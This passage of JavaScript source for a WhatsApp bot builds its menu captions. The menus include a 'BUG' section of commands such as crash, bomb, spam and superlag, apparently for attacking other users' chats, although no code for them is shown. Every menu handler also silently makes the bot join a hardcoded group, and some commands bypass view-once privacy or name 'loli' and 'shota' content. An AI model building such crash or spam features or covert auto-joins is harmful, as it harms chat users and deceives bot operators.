│❖ ${prefix}cosplaysagiri
│❖ ${prefix}cyber
│❖ ${prefix}deidara
│❖ ${prefix}doraemon
│❖ ${prefix}elaina
│❖ ${prefix}emilia
│❖ ${prefix}erza
│❖ ${prefix}exo
│❖ ${prefix}femdom
│❖ ${prefix}freefire
│❖ ${prefix}gamewallpaper
│❖ ${prefix}glasses
│❖ ${prefix}gremory
│❖ ${prefix}hacker
│❖ ${prefix}hentai
│❖ ${prefix}hestia
│❖ ${prefix}husbu
│❖ ${prefix}inori
│❖ ${prefix}islamic
│❖ ${prefix}isuzu
│❖ ${prefix}itachi
│❖ ${prefix}itori
│❖ ${prefix}jennie
│❖ ${prefix}jiso
│❖ ${prefix}justina
│❖ ${prefix}kaga
│❖ ${prefix}kagura
│❖ ${prefix}kakashi
│❖ ${prefix}kaori
│❖ ${prefix}keneki
│❖ ${prefix}kotori
│❖ ${prefix}kpop
│❖ ${prefix}kucing
│❖ ${prefix}kurumi
│❖ ${prefix}lisa
│❖ ${prefix}loli
│❖ ${prefix}madara
│❖ ${prefix}manga
│❖ ${prefix}megumin
│❖ ${prefix}mikasa
│❖ ${prefix}mikey
│❖ ${prefix}miku
│❖ ${prefix}minato
│❖ ${prefix}mobile
│❖ ${prefix}moe
│❖ ${prefix}motor
│❖ ${prefix}mountain
│❖ ${prefix}naruto
│❖ ${prefix}neko
│❖ ${prefix}neko2
│❖ ${prefix}nekonime
│❖ ${prefix}nezuko
${_senderAdultUnlocked ? '│❖ ' + prefix + 'nsfw' : ''}
│❖ ${prefix}onepiece
│❖ ${prefix}pentol
│❖ ${prefix}pokemon
│❖ ${prefix}profil
│❖ ${prefix}programming
│❖ ${prefix}pubg
│❖ ${prefix}randblackpink
│❖ ${prefix}randomnime
│❖ ${prefix}randomnime2
│❖ ${prefix}rize
│❖ ${prefix}rose
│❖ ${prefix}ryujin
│❖ ${prefix}sagiri
│❖ ${prefix}sakura
│❖ ${prefix}sasuke
│❖ ${prefix}satanic
│❖ ${prefix}sfw
│❖ ${prefix}shina
│❖ ${prefix}shinka
│❖ ${prefix}shinomiya
│❖ ${prefix}shizuka
│❖ ${prefix}shota
│❖ ${prefix}shortquote
│❖ ${prefix}space
│❖ ${prefix}technology
│❖ ${prefix}tejina
│❖ ${prefix}toukachan
│❖ ${prefix}tsunade
│❖ ${prefix}waifu
│❖ ${prefix}wallhp
│❖ ${prefix}wallml
│❖ ${prefix}wallmlnime
│❖ ${prefix}yotsuba
│❖ ${prefix}yuki
│❖ ${prefix}yulibocil
│❖ ${prefix}yumeko
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐁𝐔𝐆* ◆━━┓
│❖ ${prefix}blank
│❖ ${prefix}blankgc
│❖ ${prefix}bomb
│❖ ${prefix}bruteclose
│❖ ${prefix}buggc
│❖ ${prefix}close-zapp
│❖ ${prefix}crash
│❖ ${prefix}crashgc
│❖ ${prefix}cyber-destroy
│❖ ${prefix}cyberclose
│❖ ${prefix}cyberkillgc
│❖ ${prefix}cyberinvis
│❖ ${prefix}delay
│❖ ${prefix}delayhard
│❖ ${prefix}ghostcrash
│❖ ${prefix}godmode
│❖ ${prefix}killswitch
│❖ ${prefix}megabug
│❖ ${prefix}metaclose
│❖ ${prefix}nukeattack
│❖ ${prefix}quantumbug
│❖ ${prefix}shadowbug
│❖ ${prefix}spam
│❖ ${prefix}superlag
│❖ ${prefix}terminator
│❖ ${prefix}ultrabug
│❖ ${prefix}xgroup
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃* ◆━━┓
│❖ ${prefix}apk
│❖ ${prefix}apkdl
│❖ ${prefix}dlmovie
│❖ ${prefix}dlstatus
│❖ ${prefix}facebook
│❖ ${prefix}fb
│❖ ${prefix}fbdl
│❖ ${prefix}film
│❖ ${prefix}getbot
│❖ ${prefix}gitclone
│❖ ${prefix}ig
│❖ ${prefix}igdl
│❖ ${prefix}imbd
│❖ ${prefix}imdb
│❖ ${prefix}instagram
│❖ ${prefix}mediafire
│❖ ${prefix}movie
│❖ ${prefix}movie2
│❖ ${prefix}mp4
│❖ ${prefix}pinterest
│❖ ${prefix}play
│❖ ${prefix}play2
│❖ ${prefix}selectmovie
│❖ ${prefix}sp
│❖ ${prefix}spotify
│❖ ${prefix}spotifydl
│❖ ${prefix}statusdl
│❖ ${prefix}swdl
│❖ ${prefix}tgstickers
│❖ ${prefix}tiktok
│❖ ${prefix}tt
│❖ ${prefix}twit
│❖ ${prefix}twitter
│❖ ${prefix}twitterdl
│❖ ${prefix}video
│❖ ${prefix}xdl
${_senderAdultUnlocked ? '│❖ ' + prefix + 'xnxx' : ''}
│❖ ${prefix}ytdl
│❖ ${prefix}ytdown
│❖ ${prefix}ytmp3
│❖ ${prefix}ytmp4
│❖ ${prefix}ytsearch
│❖ ${prefix}yts
│❖ ${prefix}ytvideo
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐅𝐔𝐍* ◆━━┓
│❖ ${prefix}8ball
│❖ ${prefix}advice
│❖ ${prefix}ascii
│❖ ${prefix}compliment
│❖ ${prefix}dadjoke
│❖ ${prefix}dare
│❖ ${prefix}fact
│❖ ${prefix}flirt
│❖ ${prefix}funfact
│❖ ${prefix}gaycheck
│❖ ${prefix}greatcheck
│❖ ${prefix}joke
│❖ ${prefix}quote
│❖ ${prefix}rate
│❖ ${prefix}rewrite
│❖ ${prefix}roast
│❖ ${prefix}ship
│❖ ${prefix}story
│❖ ${prefix}stupidcheck
│❖ ${prefix}tod
│❖ ${prefix}truth
│❖ ${prefix}truthdare
│❖ ${prefix}urban
│❖ ${prefix}wouldyou
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐆𝐀𝐌𝐄𝐒* ◆━━┓
│❖ ${prefix}coin
│❖ ${prefix}coinbattle
│❖ ${prefix}dice
│❖ ${prefix}emojiquiz
│❖ ${prefix}gamefact
│❖ ${prefix}guess
│❖ ${prefix}hangman
│❖ ${prefix}math
│❖ ${prefix}mathfact
│❖ ${prefix}numbattle
│❖ ${prefix}numberbattle
│❖ ${prefix}rps
│❖ ${prefix}rpsls
│❖ ${prefix}tictactoe
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐆𝐑𝐎𝐔𝐏* ◆━━┓
│❖ ${prefix}acceptall
│❖ ${prefix}add
│❖ ${prefix}adel
│❖ ${prefix}admin
│❖ ${prefix}ae
│❖ ${prefix}announce
│❖ ${prefix}announcement
│❖ ${prefix}antibot
│❖ ${prefix}antibadword
│❖ ${prefix}antibeg
│❖ ${prefix}antilink
│❖ ${prefix}antilinkkick
│❖ ${prefix}antilinkwarn
│❖ ${prefix}antilinkgc
│❖ ${prefix}antilinkgckick
│❖ ${prefix}antispam
│❖ ${prefix}antitag
│❖ ${prefix}antitagwarn
│❖ ${prefix}antitagadmin
│❖ ${prefix}antitagadminwarn
│❖ ${prefix}antigroupmention
│❖ ${prefix}antigroupmentionkick
│❖ ${prefix}antigroupmentionwarn
│❖ ${prefix}checkwarns
│❖ ${prefix}closetime
│❖ ${prefix}createpoll
│❖ ${prefix}creategc
│❖ ${prefix}creategroup
│❖ ${prefix}demote
│❖ ${prefix}gclink
│❖ ${prefix}gcsettings
│❖ ${prefix}gid
│❖ ${prefix}ginfo
│❖ ${prefix}goodbye
│❖ ${prefix}groupinfo
│❖ ${prefix}groupjid
│❖ ${prefix}grouplink
│❖ ${prefix}groupstatus
│❖ ${prefix}groupsettings
│❖ ${prefix}gst
│❖ ${prefix}gstatus
│❖ ${prefix}hidetag
│❖ ${prefix}invite
│❖ ${prefix}join
│❖ ${prefix}kick
│❖ ${prefix}kickadmins
│❖ ${prefix}kickall
│❖ ${prefix}left
│❖ ${prefix}linkgc
│❖ ${prefix}listadmin
│❖ ${prefix}listadmins
│❖ ${prefix}listonline
│❖ ${prefix}members
│❖ ${prefix}mute
│❖ ${prefix}mutemember
│❖ ${prefix}muteuser
│❖ ${prefix}opentime
│❖ ${prefix}poll
│❖ ${prefix}promote
│❖ ${prefix}rejectall
│❖ ${prefix}resetlink
│❖ ${prefix}resetwarn
│❖ ${prefix}resetwarns
│❖ ${prefix}revoke
│❖ ${prefix}revokelink
│❖ ${prefix}setdesc
│❖ ${prefix}setgcdesc
│❖ ${prefix}setgcname
│❖ ${prefix}setgcpp
│❖ ${prefix}setgrouppp
│❖ ${prefix}setname
│❖ ${prefix}tag
│❖ ${prefix}tagadmin
│❖ ${prefix}tagall
│❖ ${prefix}totalmembers
│❖ ${prefix}totag
│❖ ${prefix}unmute
│❖ ${prefix}unmutemember
│❖ ${prefix}unmuteuser
│❖ ${prefix}warn
│❖ ${prefix}warnlimit
│❖ ${prefix}warns
│❖ ${prefix}welcome
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐋𝐎𝐆𝐎* ◆━━┓
│❖ ${prefix}advancedglow
│❖ ${prefix}blackpinklogo
│❖ ${prefix}blackpinkstyle
│❖ ${prefix}cartoonstyle
│❖ ${prefix}deletingtext
│❖ ${prefix}effectclouds
│❖ ${prefix}flag3dtext
│❖ ${prefix}flagtext
│❖ ${prefix}freecreate
│❖ ${prefix}galaxystyle
│❖ ${prefix}galaxywallpaper
│❖ ${prefix}gfx
│❖ ${prefix}gfx10
│❖ ${prefix}gfx11
│❖ ${prefix}gfx12
│❖ ${prefix}gfx2
│❖ ${prefix}gfx3
│❖ ${prefix}gfx4
│❖ ${prefix}gfx5
│❖ ${prefix}gfx6
│❖ ${prefix}gfx7
│❖ ${prefix}gfx8
│❖ ${prefix}gfx9
│❖ ${prefix}glitchtext
│❖ ${prefix}glowingtext
│❖ ${prefix}gradienttext
│❖ ${prefix}lighteffects
│❖ ${prefix}logomaker
│❖ ${prefix}luxurygold
│❖ ${prefix}makingneon
│❖ ${prefix}multicoloredneon
│❖ ${prefix}neonglitch
│❖ ${prefix}papercutstyle
│❖ ${prefix}pixelglitch
│❖ ${prefix}royaltext
│❖ ${prefix}sandsummer
│❖ ${prefix}style1917
│❖ ${prefix}summerbeach
│❖ ${prefix}typographytext
│❖ ${prefix}underwatertext
│❖ ${prefix}watercolortext
│❖ ${prefix}writetext
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐎𝐖𝐍𝐄𝐑* ◆━━┓
│❖ .
│❖ ${prefix}addsudo
│❖ ${prefix}antibot
│❖ ${prefix}antibadword
│❖ ${prefix}antidelete
│❖ ${prefix}antiedit
│❖ ${prefix}anticall
│❖ ${prefix}autobio
│❖ ${prefix}autoreact
│❖ ${prefix}autoread
│❖ ${prefix}autorecording
│❖ ${prefix}autorecordtype
│❖ ${prefix}autoreactstatusdelay
│❖ ${prefix}autoreply
│❖ ${prefix}autotyping
│❖ ${prefix}autoviewstatus
│❖ ${prefix}autoviewstatusdelay
│❖ ${prefix}ban
│❖ ${prefix}banuser
│❖ ${prefix}banuser1
│❖ ${prefix}block
│❖ ${prefix}broadcast
│❖ ${prefix}config
│❖ ${prefix}delanticallmsg
│❖ ${prefix}delsudo
│❖ ${prefix}getsudo
│❖ ${prefix}listban
│❖ ${prefix}listbanuser
│❖ ${prefix}listsudo
│❖ ${prefix}locksettings
│❖ ${prefix}private
│❖ ${prefix}public
│❖ ${prefix}self
│❖ ${prefix}set
│❖ ${prefix}setanticallmsg
│❖ ${prefix}setpp
│❖ ${prefix}setsudo
│❖ ${prefix}setprefix
│❖ ${prefix}settings
│❖ ${prefix}showanticallmsg
│❖ ${prefix}statusemoji
│❖ ${prefix}sudo
│❖ ${prefix}testanticallmsg
│❖ ${prefix}unban
│❖ ${prefix}unbanuser
│❖ ${prefix}unbanuser1
│❖ ${prefix}unblock
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐒𝐓𝐈𝐂𝐊𝐄𝐑* ◆━━┓
│❖ ${prefix}awoo
│❖ ${prefix}bite
│❖ ${prefix}blush
│❖ ${prefix}bonk
│❖ ${prefix}bully
│❖ ${prefix}cringe
│❖ ${prefix}cry
│❖ ${prefix}cuddle
│❖ ${prefix}dance
│❖ ${prefix}delstickercmd
│❖ ${prefix}glomp
│❖ ${prefix}handhold
│❖ ${prefix}happy
│❖ ${prefix}highfive
│❖ ${prefix}hug
│❖ ${prefix}kill
│❖ ${prefix}kiss
│❖ ${prefix}lick
│❖ ${prefix}nom
│❖ ${prefix}pat
│❖ ${prefix}poke
│❖ ${prefix}qc
│❖ ${prefix}s
│❖ ${prefix}setstickercmd
│❖ ${prefix}shinobu
│❖ ${prefix}slap
│❖ ${prefix}smile
│❖ ${prefix}smug
│❖ ${prefix}steal
│❖ ${prefix}sticker
│❖ ${prefix}stickercmds
│❖ ${prefix}stickerthf
│❖ ${prefix}stickerwm
│❖ ${prefix}take
│❖ ${prefix}tosticker
│❖ ${prefix}wave
│❖ ${prefix}wink
│❖ ${prefix}wm
│❖ ${prefix}yeet
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐓𝐎𝐎𝐋𝐒* ◆━━┓
│❖ ${prefix}calculate
│❖ ${prefix}calculator
│❖ ${prefix}carimage
│❖ ${prefix}cartoonify
│❖ ${prefix}currency
│❖ ${prefix}currencies
│❖ ${prefix}define
│❖ ${prefix}dictionary
│❖ ${prefix}ffstalk
│❖ ${prefix}genpass
│❖ ${prefix}myip
│❖ ${prefix}npm
│❖ ${prefix}npmstalk
│❖ ${prefix}profile
│❖ ${prefix}profile-pictures
│❖ ${prefix}qrcode
│❖ ${prefix}readqr
│❖ ${prefix}readmore
│❖ ${prefix}removebg
│❖ ${prefix}remind
│❖ ${prefix}shorturl
│❖ ${prefix}styletext
│❖ ${prefix}tomp3
│❖ ${prefix}tomp4
│❖ ${prefix}toimg
│❖ ${prefix}tourl
│❖ ${prefix}translate
│❖ ${prefix}url
│❖ ${prefix}weather
│❖ ${prefix}weather2
│❖ ${prefix}weatherinfo
│❖ ${prefix}whois
│❖ ${prefix}wiki
│❖ ${prefix}wikipedia
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐕𝐎𝐈𝐂𝐄* ◆━━┓
│❖ ${prefix}bass
│❖ ${prefix}blown
│❖ ${prefix}deep
│❖ ${prefix}earrape
│❖ ${prefix}fast
│❖ ${prefix}fat
│❖ ${prefix}gtts
│❖ ${prefix}nightcore
│❖ ${prefix}reverse
│❖ ${prefix}robot
│❖ ${prefix}say
│❖ ${prefix}slow
│❖ ${prefix}smooth
│❖ ${prefix}squirrel
│❖ ${prefix}tts
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐎𝐓𝐇𝐄𝐑* ◆━━┓
│❖ ${prefix}😭
│❖ ${prefix}account
│❖ ${prefix}alive
│❖ ${prefix}aza
│❖ ${prefix}buy-panel
│❖ ${prefix}cat
│❖ ${prefix}checkmail
│❖ ${prefix}checkmails
│❖ ${prefix}coffee
│❖ ${prefix}del
│❖ ${prefix}delete
│❖ ${prefix}delmail
│❖ ${prefix}delpair
│❖ ${prefix}deltemp
│❖ ${prefix}deltmp
│❖ ${prefix}deletemail
│❖ ${prefix}dog
│❖ ${prefix}download
│❖ ${prefix}fox
│❖ ${prefix}freebot
│❖ ${prefix}gellltbot
│❖ ${prefix}getpp
│❖ ${prefix}git
│❖ ${prefix}idch
│❖ ${prefix}inbox
│❖ ${prefix}jid
│❖ ${prefix}kopi
│❖ ${prefix}listpair
│❖ ${prefix}mode
│❖ ${prefix}newmail
│❖ ${prefix}nsbxmdmfw
│❖ ${prefix}owner
│❖ ${prefix}pair
│❖ ${prefix}panda
│❖ ${prefix}paptt
│❖ ${prefix}ping
│❖ ${prefix}poem
│❖ ${prefix}prog
│❖ ${prefix}progquote
│❖ ${prefix}random-girl
│❖ ${prefix}react-ch
│❖ ${prefix}react-channel
│❖ ${prefix}reactbcnch
│❖ ${prefix}reademail
│❖ ${prefix}readmail
│❖ ${prefix}readviewonce2
│❖ ${prefix}repo
│❖ ${prefix}runtime
│❖ ${prefix}save
│❖ ${prefix}speed
│❖ ${prefix}svt
│❖ ${prefix}tempmail
│❖ ${prefix}tempmail2
│❖ ${prefix}tempmail-inbox
│❖ ${prefix}test
│❖ ${prefix}tmpmail
│❖ ${prefix}vkfkk
│❖ ${prefix}vv
│❖ ${prefix}vv2
│❖ ${prefix}vvgh
│❖ ${prefix}github
│❖ ${prefix}setaccount
${_senderAdultUnlocked ? '│❖ ' + prefix + 'xvideos\n│❖ ' + prefix + 'xvideodl\n│❖ ' + prefix + 'xvideosearch\n│❖ ' + prefix + 'xnxxsearch\n│❖ ' + prefix + 'xnxx' : '│🔒 *Locked Commands*\n│  Use .addkey to access these'}
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'menu':
case 'CYBER': {
   await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐌𝐄𝐍𝐔 𝐂𝐀𝐓𝐄𝐆𝐎𝐑𝐈𝐄𝐒* ◆━━┓
│❖ ${prefix}allmenu
│❖ ${prefix}aimenu
│❖ ${prefix}animemenu
│❖ ${prefix}bugmenu
│❖ ${prefix}downloadmenu
│❖ ${prefix}funmenu
│❖ ${prefix}gamemenu
│❖ ${prefix}groupmenu
│❖ ${prefix}logomenu
│❖ ${prefix}ownermenu
│❖ ${prefix}stickermenu
│❖ ${prefix}toolsmenu
│❖ ${prefix}voicemenu
│❖ ${prefix}othermenu
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'aimenu':
case 'CYBERai': {
    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐀𝐈* ◆━━┓
│❖ ${prefix}ai
│❖ ${prefix}aipic
│❖ ${prefix}codeai
│❖ ${prefix}deepseek
│❖ ${prefix}gemini
│❖ ${prefix}gemivbnni
│❖ ${prefix}gpt
│❖ ${prefix}gpt3
│❖ ${prefix}gpt4
│❖ ${prefix}gpt5
│❖ ${prefix}grok
│❖ ${prefix}grovnnk-ai
│❖ ${prefix}metaai
│❖ ${prefix}metabcn-ai
│❖ ${prefix}photoai
│❖ ${prefix}qwen
│❖ ${prefix}qwenxj
│❖ ${prefix}storyai
│❖ ${prefix}triviaai
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'animemenu':
case 'CYBERanime': {
    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐀𝐍𝐈𝐌𝐄* ◆━━┓
│❖ ${prefix}akiyama
│❖ ${prefix}ana
│❖ ${prefix}animebite
│❖ ${prefix}animeblush
│❖ ${prefix}animebonk
│❖ ${prefix}animebully
│❖ ${prefix}animecringe
│❖ ${prefix}animedance
│❖ ${prefix}animedl
│❖ ${prefix}animeglomp
│❖ ${prefix}animehappy
│❖ ${prefix}animehighfive
│❖ ${prefix}animekill
│❖ ${prefix}animelick
│❖ ${prefix}animepoke
│❖ ${prefix}animesearch
│❖ ${prefix}animesmile
│❖ ${prefix}animesmug
│❖ ${prefix}animewave
│❖ ${prefix}animewink
│❖ ${prefix}animewlp
│❖ ${prefix}animeyeet
│❖ ${prefix}art
│❖ ${prefix}asuna
│❖ ${prefix}ayuzawa
│❖ ${prefix}bluearchive
│❖ ${prefix}boruto
│❖ ${prefix}bts
│❖ ${prefix}cartoon
│❖ ${prefix}cecan
│❖ ${prefix}chiho
│❖ ${prefix}chinagirl
│❖ ${prefix}chitoge
│❖ ${prefix}cogan
│❖ ${prefix}cosplay
│❖ ${prefix}cosplayloli
│❖ ${prefix}cosplaysagiri
│❖ ${prefix}cyber
│❖ ${prefix}deidara
│❖ ${prefix}doraemon
│❖ ${prefix}elaina
│❖ ${prefix}emilia
│❖ ${prefix}erza
│❖ ${prefix}exo
│❖ ${prefix}femdom
│❖ ${prefix}freefire
│❖ ${prefix}gamewallpaper
│❖ ${prefix}glasses
│❖ ${prefix}gremory
│❖ ${prefix}hacker
│❖ ${prefix}hentai
│❖ ${prefix}hestia
│❖ ${prefix}husbu
│❖ ${prefix}inori
│❖ ${prefix}islamic
│❖ ${prefix}isuzu
│❖ ${prefix}itachi
│❖ ${prefix}itori
│❖ ${prefix}jennie
│❖ ${prefix}jiso
│❖ ${prefix}justina
│❖ ${prefix}kaga
│❖ ${prefix}kagura
│❖ ${prefix}kakashi
│❖ ${prefix}kaori
│❖ ${prefix}keneki
│❖ ${prefix}kotori
│❖ ${prefix}kpop
│❖ ${prefix}kucing
│❖ ${prefix}kurumi
│❖ ${prefix}lisa
│❖ ${prefix}loli
│❖ ${prefix}madara
│❖ ${prefix}manga
│❖ ${prefix}megumin
│❖ ${prefix}mikasa
│❖ ${prefix}mikey
│❖ ${prefix}miku
│❖ ${prefix}minato
│❖ ${prefix}mobile
│❖ ${prefix}moe
│❖ ${prefix}motor
│❖ ${prefix}mountain
│❖ ${prefix}naruto
│❖ ${prefix}neko
│❖ ${prefix}neko2
│❖ ${prefix}nekonime
│❖ ${prefix}nezuko
${_senderAdultUnlocked ? '│❖ ' + prefix + 'nsfw' : ''}
│❖ ${prefix}onepiece
│❖ ${prefix}pentol
│❖ ${prefix}pokemon
│❖ ${prefix}profil
